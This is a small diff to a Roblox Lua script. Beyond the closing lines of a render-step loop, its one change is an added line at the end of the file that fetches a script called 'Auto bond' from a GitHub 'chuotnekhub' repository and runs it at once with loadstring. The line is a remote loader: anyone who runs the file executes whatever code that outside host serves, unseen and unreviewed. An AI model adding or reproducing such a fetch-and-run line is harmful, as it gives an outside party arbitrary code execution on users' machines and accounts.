@@ -46,3 +46,4 @@ RunService.RenderStepped:Connect(function()
 		end
 	end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sonnek1203/chuotnekhub/refs/heads/main/Auto%20bond"))()
